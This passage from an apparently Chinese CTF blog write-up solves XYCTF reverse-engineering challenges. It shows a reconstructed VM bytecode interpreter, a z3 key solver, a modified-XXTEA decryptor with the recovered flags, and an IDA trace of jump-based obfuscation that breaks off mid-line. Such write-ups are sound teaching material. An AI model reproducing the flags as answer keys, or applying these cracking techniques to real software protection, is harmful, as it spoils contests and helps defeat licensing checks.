class="number">232</span>] = <span class="number">2</span>;<span class="comment">//input[6]+=2,i,j+1</span></span><br><span class="line">code[<span class="number">256</span>] = <span class="number">2</span>;<span class="comment">//input[7]+=23,i,j+1</span></span><br><span class="line">code[<span class="number">257</span>] = <span class="number">5</span>;<span class="comment">//input[8]-后一位+70</span></span><br><span class="line">code[<span class="number">303</span>] = <span class="number">1</span>;<span class="comment">//input[8]+45</span></span><br><span class="line">code[<span class="number">304</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">305</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">306</span>] = <span class="number">1</span>;<span class="comment">//input[8]-4</span></span><br><span class="line">code[<span class="number">307</span>] = <span class="number">2</span>;<span class="comment">//i,j+1</span></span><br><span class="line">code[<span class="number">308</span>] = <span class="number">5</span>;<span class="comment">//input[9]-后一位+70</span></span><br><span class="line">code[<span class="number">328</span>] = <span class="number">1</span>;<span class="comment">//input[9]+19</span></span><br><span class="line">code[<span class="number">329</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">330</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">331</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">332</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">333</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">334</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">335</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">336</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">337</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">338</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">339</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">340</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">341</span>] = <span class="number">1</span>;<span class="comment">//input[9]-14</span></span><br><span class="line">code[<span class="number">342</span>] = <span class="number">2</span>;<span class="comment">//input[10]</span></span><br><span class="line">code[<span class="number">353</span>] = <span class="number">2</span>;<span class="comment">//input[10]+10,input[11]</span></span><br><span class="line">code[<span class="number">354</span>] = <span class="number">5</span>;<span class="comment">//input[11]-后一位+70</span></span><br><span class="line">code[<span class="number">430</span>] = <span class="number">2</span>;<span class="comment">//input[11]+75,input[12]</span></span><br><span class="line">code[<span class="number">431</span>] = <span class="number">2</span>;<span class="comment">//input[13]</span></span><br><span class="line">code[<span class="number">432</span>] = <span class="number">5</span>;<span class="comment">//input[13]-后一位+70</span></span><br><span class="line">code[<span class="number">523</span>] = <span class="number">2</span>;<span class="comment">//input[13]+90,input[14]</span></span><br><span class="line">code[<span class="number">524</span>] = <span class="number">5</span>;<span class="comment">//input[14]-后一位+70</span></span><br><span class="line">code[<span class="number">564</span>] = <span class="number">2</span>;<span class="comment">//input[14]+=39,input[15]</span></span><br><span class="line">code[<span class="number">565</span>] = <span class="number">5</span>;<span class="comment">//input[15]-后一位+70</span></span><br><span class="line">code[<span class="number">627</span>] = <span class="number">2</span>;<span class="comment">//input[15]+=61,input[16]</span></span><br><span class="line">code[<span class="number">628</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">629</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">630</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">631</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">632</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">633</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">634</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">635</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">636</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">637</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">638</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">639</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">640</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">641</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">642</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">643</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">644</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">645</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">646</span>] = <span class="number">1</span>;<span class="comment">//input[16]-=19</span></span><br><span class="line">code[<span class="number">647</span>] = <span class="number">2</span>;<span class="comment">//input[17]</span></span><br><span class="line">code[<span class="number">648</span>] = <span class="number">4</span>;<span class="comment">//input[17]+后一位-70</span></span><br><span class="line">code[<span class="number">649</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">650</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">651</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">652</span>] = <span class="number">1</span>;<span class="comment">//input[17]-4</span></span><br><span class="line">code[<span class="number">653</span>] = <span class="number">2</span>;<span class="comment">//input[18]</span></span><br><span class="line">code[<span class="number">680</span>] = <span class="number">2</span>;<span class="comment">//input[18]+26,input[19]</span></span><br><span class="line">code[<span class="number">687</span>] = <span class="number">2</span>;<span class="comment">//input[19]+6,input[20]</span></span><br><span class="line">code[<span class="number">688</span>] = <span class="number">4</span>;<span class="comment">//input[20]+后一位-70</span></span><br><span class="line">code[<span class="number">698</span>] = <span class="number">2</span>;<span class="comment">//input[20]+9,input[21]</span></span><br><span class="line">code[<span class="number">766</span>] = <span class="number">2</span>;<span class="comment">//input[21]+67,input[22]</span></span><br><span class="line">code[<span class="number">767</span>] = <span class="number">5</span>;<span class="comment">//input[22]-后一位+70</span></span><br><span class="line">code[<span class="number">818</span>] = <span class="number">2</span>;<span class="comment">//input[22]+50,input[23]</span></span><br><span class="line">code[<span class="number">819</span>] = <span class="number">1</span>;<span class="comment">//input[23]-1</span></span><br><span class="line">code[<span class="number">820</span>] = <span class="number">2</span>;<span class="comment">//input[24]</span></span><br><span class="line">code[<span class="number">827</span>] = <span class="number">2</span>;<span class="comment">//input[24]+6,input[25]</span></span><br><span class="line">code[<span class="number">828</span>] = <span class="number">5</span>;<span class="comment">//input[25]-后一位+70</span></span><br><span class="line">code[<span class="number">846</span>] = <span class="number">2</span>;<span class="comment">//input[25]+17,input[26]</span></span><br><span class="line">code[<span class="number">847</span>] = <span class="number">5</span>;<span class="comment">//input[26]-后一位+70</span></span><br><span class="line">code[<span class="number">890</span>] = <span class="number">2</span>;<span class="comment">//input[26]+42,input[27]</span></span><br><span class="line">code[<span class="number">891</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">892</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">893</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">894</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">895</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">896</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">897</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">898</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">899</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">900</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">901</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">902</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">903</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">904</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">905</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">906</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">907</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">908</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">909</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">910</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">911</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">912</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">913</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">914</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">915</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">916</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">917</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">918</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">919</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">920</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">921</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">922</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">923</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">924</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">925</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">926</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">927</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">928</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">929</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">930</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">931</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">932</span>] = <span class="number">1</span>;<span class="comment">//input[27]-42</span></span><br><span class="line">code[<span class="number">933</span>] = <span class="number">2</span>;<span class="comment">//input[28]</span></span><br><span class="line">code[<span class="number">934</span>] = <span class="number">5</span>;<span class="comment">//input[28]-后一位+70</span></span><br><span class="line">code[<span class="number">989</span>] = <span class="number">2</span>;<span class="comment">//input[28]-54,input[29]</span></span><br><span class="line">code[<span class="number">994</span>] = <span class="number">2</span>;<span class="comment">//input[29]+3,input[30]</span></span><br><span class="line">code[<span class="number">995</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">996</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">997</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">998</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">999</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1000</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1001</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1002</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1003</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1013</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1014</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1015</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1016</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1017</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1018</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1019</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1020</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1021</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1022</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1023</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1024</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1025</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1026</span>] = <span class="number">1</span>;<span class="comment">//input[30]-23</span></span><br><span class="line">code[<span class="number">1027</span>] = <span class="number">2</span>;<span class="comment">//input[31]</span></span><br><span class="line">code[<span class="number">1028</span>] = <span class="number">3</span>;</span><br><span class="line">i = <span class="number">31</span>;</span><br><span class="line">j = <span class="number">1027</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt;= <span class="number">-1</span> || i &lt;= <span class="number">-1</span>) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">0</span>) &#123;<span class="comment">//code=0</span></span><br><span class="line">--j;</span><br><span class="line">--input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">1</span>) &#123;</span><br><span class="line">--j;</span><br><span class="line">++input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">2</span>) &#123;<span class="comment">//递增位</span></span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">3</span>)<span class="comment">//结束标志</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">4</span>) &#123;</span><br><span class="line">input[i] = input[i] - input[i + <span class="number">1</span>] + <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (code[j] == <span class="number">5</span>) &#123;</span><br><span class="line">input[i] = input[i] + input[i + <span class="number">1</span>] - <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> input[<span class="number">32</span>] = &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">125</span> &#125;;</span><br><span class="line">processCode(input);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(input); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, input[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//&quot;FLAG&#123;vm_is_A_3ecreT_l0Ve_revers&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果直接就出了</p><h4 id="舔狗四部曲–相逢已是上上签">舔狗四部曲–相逢已是上上签</h4><p>先用010edtior把指向pe头的偏移修好，改成0001。然后进去用z3把key求出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key,out = zini(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">532</span> * key[<span class="number">5</span>] + <span class="number">829</span> * key[<span class="number">4</span>] + <span class="number">258</span> * key[<span class="number">3</span>] + <span class="number">811</span> * key[<span class="number">2</span>] + <span class="number">997</span> * key[<span class="number">1</span>] + <span class="number">593</span> * key[<span class="number">0</span>] == <span class="number">292512</span>)</span><br><span class="line">s.add(<span class="number">576</span> * key[<span class="number">5</span>] + <span class="number">695</span> * key[<span class="number">4</span>] + <span class="number">602</span> * key[<span class="number">3</span>] + <span class="number">328</span> * key[<span class="number">2</span>] + <span class="number">686</span> * key[<span class="number">1</span>] + <span class="number">605</span> * key[<span class="number">0</span>] == <span class="number">254496</span>)</span><br><span class="line">s.add(<span class="number">580</span> * key[<span class="number">5</span>] + <span class="number">448</span> * key[<span class="number">4</span>] + <span class="number">756</span> * key[<span class="number">3</span>] + <span class="number">449</span> * key[<span class="number">2</span>] + (key[<span class="number">1</span>] &lt;&lt; <span class="number">9</span>) + <span class="number">373</span> * key[<span class="number">0</span>] == <span class="number">222479</span>)</span><br><span class="line">s.add(<span class="number">597</span> * key[<span class="number">5</span>] + <span class="number">855</span> * key[<span class="number">4</span>] + <span class="number">971</span> * key[<span class="number">3</span>] + <span class="number">422</span> * key[<span class="number">2</span>] + <span class="number">635</span> * key[<span class="number">1</span>] + <span class="number">560</span> * key[<span class="number">0</span>] == <span class="number">295184</span>)</span><br><span class="line">s.add(<span class="number">524</span> * key[<span class="number">5</span>] + <span class="number">324</span> * key[<span class="number">4</span>] + <span class="number">925</span> * key[<span class="number">3</span>] + <span class="number">388</span> * key[<span class="number">2</span>] + <span class="number">507</span> * key[<span class="number">1</span>] + <span class="number">717</span> * key[<span class="number">0</span>] == <span class="number">251887</span>)</span><br><span class="line">s.add(<span class="number">414</span> * key[<span class="number">5</span>] + <span class="number">495</span> * key[<span class="number">4</span>] + <span class="number">518</span> * key[<span class="number">3</span>] + <span class="number">884</span> * key[<span class="number">2</span>] + <span class="number">368</span> * key[<span class="number">1</span>] + <span class="number">312</span> * key[<span class="number">0</span>] == <span class="number">211260</span>)</span><br><span class="line"></span><br><span class="line">zcheck(s,key)</span><br><span class="line"><span class="comment"># XYCTF!</span></span><br></pre></td></tr></table></figure><p>然后后面是一个魔改tea，直接解</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec2</span><span class="params">(DWORD* flag, <span class="type">int</span> len_after)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> mid; <span class="comment">// [esp+4h] [ebp-1Ch]</span></span><br><span class="line"><span class="type">int</span> round; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flag_last; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len_after &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">round = <span class="number">52</span> / len_after + <span class="number">6</span>;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">sum -= round * <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = len_after - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] -= ((flag[(i + <span class="number">7</span>) % <span class="number">8</span>] ^ key[(((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">5</span>) ^ i) &amp; <span class="number">5</span>]) + (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] ^ sum)) ^ (((<span class="number">16</span> * flag[(i + <span class="number">7</span>) % <span class="number">8</span>]) ^ (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * flag[(i + <span class="number">1</span>) % <span class="number">8</span>]) ^ (flag[(i + <span class="number">7</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">&#125;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">--round;</span><br><span class="line">&#125; <span class="keyword">while</span> (round);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x85</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0x89</span>, <span class="number">0x1B</span>, <span class="number">0x8C</span>, <span class="number">0x18</span>, <span class="number">0xC5</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xBC</span>, <span class="number">0x72</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x53</span>, <span class="number">0xAC</span>, <span class="number">0x46</span>, <span class="number">0xA1</span>, <span class="number">0x4D</span>, <span class="number">0x6B</span>, <span class="number">0x0D</span>, <span class="number">0x63</span>, <span class="number">0x86</span>, <span class="number">0xF0</span>, <span class="number">0x97</span>, <span class="number">0x97</span>, <span class="number">0xF8</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">dec2</span>((DWORD*)last, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; (last[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// XYCTF&#123;XXTEA_AND_Z3_1s_S0_easy!!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–记忆的时光机">舔狗四部曲–记忆的时光机</h4><p>第一次遇到这种jmp+寄存器的值，不过通过分析可以看出均为顺序跳转，直接trance，然后分析，大概得出加密逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">0000E808.text:enc+4sub     rsp, 48hRSP=00007FFCB17CE120 CF=0 PF=0 SF=0</span><br><span class="line">0000E808.text:enc+8lea     rcx, sub_558B201D1460RCX=0000558B201D1460</span><br><span class="line">0000E808.text:enc+Fmov     edx, 2RDX=0000000000000002</span><br><span class="line">0000E808.text:enc+14movsxd  r10, esiR10=0000000000000001</span><br><span class="line">0000E808.text:enc+17mov     rax, fs:28hRAX=374B368125068200</span><br><span class="line">0000E808.text:enc+20mov     [rsp+48h+var_10], rax</span><br><span class="line">0000E808.text:enc+25xor     eax, eaxRAX=0000000000000000 PF=1 ZF=1</span><br><span class="line">0000E808.text:enc+27lea     rax, sub_558B201D1448RAX=0000558B201D1448</span><br><span class="line">0000E808.text:enc+2Emov     [rsp+48h+var_48], rcx</span><br><span class="line">0000E808.text:enc+32add     esi, 6RSI=0000000000000007 PF=0 ZF=0</span><br><span class="line">0000E808.text:enc+35mov     [rsp+48h+var_40], rax</span><br><span class="line">0000E808.text:enc+3Alea     rax, sub_558B201D1430RAX=0000558B201D1430</span><br><span class="line">0000E808.text:enc+41lea     r11, key; \&quot;i_have_get_shell_but_where_is_you_my_de\&quot;...</span><br><span class="line">0000E808.text:enc+48mov     [rsp+48h+var_38], rax</span><br><span class="line">0000E808.text:enc+4Dlea     rax, sub_558B201D1418RAX=0000558B201D1418</span><br><span class="line">0000E808.text:enc+54mov     [rsp+48h+var_30], rax</span><br><span class="line">0000E808.text:enc+59lea     rax, sub_558B201D1400RAX=0000558B201D1400</span><br><span class="line">0000E808.text:enc+60mov     [rsp+48h+var_28], rax</span><br><span class="line">0000E808.text:enc+65lea     rax, loc_558B201D13E0RAX=0000558B201D13E0</span><br><span class="line">0000E808.text:enc+6Cmov     [rsp+48h+var_20], rax</span><br><span class="line">0000E808.text:enc+71lea     eax, [rdx-1]RAX=0000000000000001</span><br><span class="line">0000E808.text:enc+74jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1460endbr64</span><br><span class="line">0000E808.text:sub_558B201D1460+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1448</span><br><span class="line">0000E808.text:sub_558B201D1460+8add     edx, 1RDX=0000000000000003 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1460+Bmov     r8d, ediR8=000000000000004D</span><br><span class="line">0000E808.text:sub_558B201D1460+Elea     eax, [rdx-1]RAX=0000000000000002</span><br><span class="line">0000E808.text:sub_558B201D1460+11jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1448endbr64</span><br><span class="line">0000E808.text:sub_558B201D1448+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1430</span><br><span class="line">0000E808.text:sub_558B201D1448+8xor     r8d, esiR8=000000000000004A PF=0</span><br><span class="line">0000E808.text:sub_558B201D1448+Badd     edx, 1RDX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1448+Exor     r8d, 66hR8=000000000000002C</span><br><span class="line">0000E808.text:sub_558B201D1448+12lea     eax, [rdx-1]RAX=0000000000000003</span><br><span class="line">0000E808.text:sub_558B201D1448+15jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1430endbr64</span><br><span class="line">0000E808.text:sub_558B201D1430+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1418</span><br><span class="line">0000E808.text:sub_558B201D1430+8add     edx, 1RDX=0000000000000005 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1430+Bsub     r8d, 6R8=0000000000000026 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1430+Flea     eax, [rdx-1]RAX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1430+12jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1418endbr64</span><br><span class="line">0000E808.text:sub_558B201D1418+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1400</span><br><span class="line">0000E808.text:sub_558B201D1418+8add     edx, 1RDX=0000000000000006 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1418+Bmovzx   r9d, byte ptr [r11+r10]R9=000000000000005F</span><br><span class="line">0000E808.text:sub_558B201D1418+10lea     eax, [rdx-1]RAX=0000000000000005</span><br><span class="line">0000E808.text:sub_558B201D1418+13jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1400endbr64</span><br><span class="line">0000E808.text:sub_558B201D1400+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D13E0</span><br><span class="line">0000E808.text:sub_558B201D1400+8add     edx, 1RDX=0000000000000007 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1400+Bxor     r8d, r9dR8=0000000000000079</span><br><span class="line">0000E808.text:sub_558B201D1400+Elea     eax, [rdx-1]RAX=0000000000000006</span><br><span class="line">0000E808.text:sub_558B201D1400+11jmp     rcx</span><br><span class="line">0000E808.text:loc_558B201D13E0endbr64</span><br><span class="line">0000E808.text:0000558B201D13E4mov     rax, [rsp+38h]RAX=374B368125068200</span><br><span class="line">0000E808.text:0000558B201D13E9sub     rax, fs:28hRAX=0000000000000000 PF=1 ZF=1</span><br><span 